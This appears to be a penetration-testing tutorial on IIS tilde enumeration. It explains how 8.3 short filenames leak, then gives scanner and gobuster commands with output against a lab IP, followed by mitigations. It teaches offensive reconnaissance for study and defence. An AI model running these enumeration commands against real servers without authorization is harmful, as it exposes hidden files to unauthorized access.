## IIS Tilde Enumeration

IIS tilde enumeration is an information disclosure technique that exploits how Microsoft IIS handles legacy Windows 8.3 short filenames.  When Windows creates a file or folder with a name longer than eight characters, it automatically generates a short alias in the `XXXXXXXX.XXX` format (six characters, tilde, sequence number, dot, three-character extension). IIS inadvertently exposes these short names by responding differently to requests containing the `~` character when the short name exists versus when it does not, allowing an attacker to reconstruct hidden filenames character by character without ever seeing a directory listing. 

This is particularly impactful against `.NET` applications because `.aspx` filenames are truncated to `.asp` in their 8.3 form, and .NET applications are frequently vulnerable to direct URL access when the full filename is known. 

***

## Affected Versions

The vulnerability was first disclosed around 2010 and affects IIS 7.5 and earlier reliably.  IIS 8.0 and above can still be vulnerable depending on whether NTFS 8.3 name creation is enabled on the underlying filesystem. Microsoft's recommended fix is disabling 8.3 name creation entirely via the registry key `NtfsDisable8dot3NameCreation`. 

***

## How the Enumeration Works

The attack probes for short filenames by sending HTTP requests using the `OPTIONS` or `GET` method and observing the response code difference between a valid and invalid short name prefix.

For a hidden directory named `SecretDocuments`, the short name would be `SECRET~1`. The attacker discovers this incrementally:

```
GET /~s       -> 200 OK     (something starts with 's')
GET /~se      -> 200 OK     (narrows to 'se')
GET /~sec     -> 200 OK     (narrows to 'sec')
GET /~secr    -> 200 OK
GET /~secre   -> 200 OK
GET /~secret  -> 200 OK     (six-character prefix confirmed)
GET /secret~1 -> accessible
```

Once the short name is confirmed, files inside can be accessed directly:

```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/somefi~1.txt
```

When multiple files share the first six characters, the sequence number increments:

| Full Name | 8.3 Short Name |
|---|---|
| `somefile.txt` | `SOMEFI~1.TXT` |
| `somefile2.txt` | `SOMEFI~2.TXT` |
| `somefile3.txt` | `SOMEFI~3.TXT` |

***

## Automated Scanning with IIS-ShortName-Scanner

Manually sending a request per character combination is impractical. The [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) tool automates the full enumeration. It requires Oracle Java to run.

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

The arguments are `[ShowProgress] [ThreadNumbers] [URL]`. Using 5 threads provides a reasonable balance between speed and avoiding DoS conditions on the target.

```
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
|_ Identified files: 3
    |_ CSASPX~1.CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

The scanner confirms the server is vulnerable and identifies two directories and three files. Note that `TRANSF~1.ASP` is not directly accessible via `GET`, so the full long filename needs to be brute-forced before the file can be accessed.

***

## Resolving Short Names to Full Filenames

### Step 1: Build a Targeted Wordlist

Use the discovered short name prefix `transf` to filter a known wordlist down to only candidates starting with those characters:

```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

The `egrep -r ^transf` finds all wordlist entries beginning with `transf`. The `sed` removes the source filename prefix that `egrep` prepends, leaving only the candidate words.

### Step 2: Enumerate with Gobuster

Run Gobuster against the target using the trimmed wordlist and append both `.asp` and `.aspx` extensions:

```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

```
/transf**.aspx    (Status: 200) [Size: 941]
```

Gobuster identifies the full filename ending in `.aspx` that corresponds to the `TRANSF~1.ASP` short name discovered by the scanner. The file is now directly accessible and can be inspected for further exploitation opportunities such as unrestricted file upload, admin functionality, or application logic vulnerabilities.

***

## Mitigation

The definitive fix is disabling Windows 8.3 filename generation at the filesystem level:

```
fsutil behavior set disable8dot3 1
```

Additionally, existing 8.3 names on the filesystem must be stripped since disabling creation does not remove names already generated. IIS-level controls should also reject or block any URL request containing the `~` character and its Unicode equivalents before the request reaches the application layer.
